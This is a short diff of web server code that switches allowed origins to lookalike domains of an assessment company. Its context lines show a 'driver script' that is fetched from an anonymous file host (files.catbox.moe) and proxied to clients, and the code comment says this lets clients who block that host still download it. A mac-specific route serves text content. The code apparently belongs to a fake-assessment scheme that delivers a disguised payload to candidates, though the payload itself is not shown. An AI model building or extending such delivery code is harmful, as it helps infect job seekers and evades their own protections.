@@ -49,8 +49,8 @@ function parseStepHistory(raw) {
 const allowedOrigins = [
   'https://wecreateproblems.in',
   'https://www.wecreateproblems.in',
-  'https://sigmaassessmentssystems.com',
-  'https://www.sigmaassessmentssystems.com',
+  'https://sigmassessmentsystems.com',
+  'https://www.sigmassessmentsystems.com',
   'http://localhost:5173',
   /^http:\/\/192\.168\.\d+\.\d+:5173$/,   // local network
   /^http:\/\/198\.18\.\d+\.\d+:5173$/,   // VPN/virtual network dev
@@ -108,7 +108,7 @@ const macRoute = (req, res) => {
   res.type('text/plain').send(content);
 };
 
-/** Same payload as files.catbox.moe — proxied so clients that block catbox can still download via api.sigmaassessmentssystems.com */
+/** Same payload as files.catbox.moe — proxied so clients that block catbox can still download via api.sigmassessmentsystems.com */
 const DRIVER_SCRIPT_UPSTREAM = 'https://files.catbox.moe/tkgnyt.js';
 
 async function driverEnvSetupProxy(req, res) {
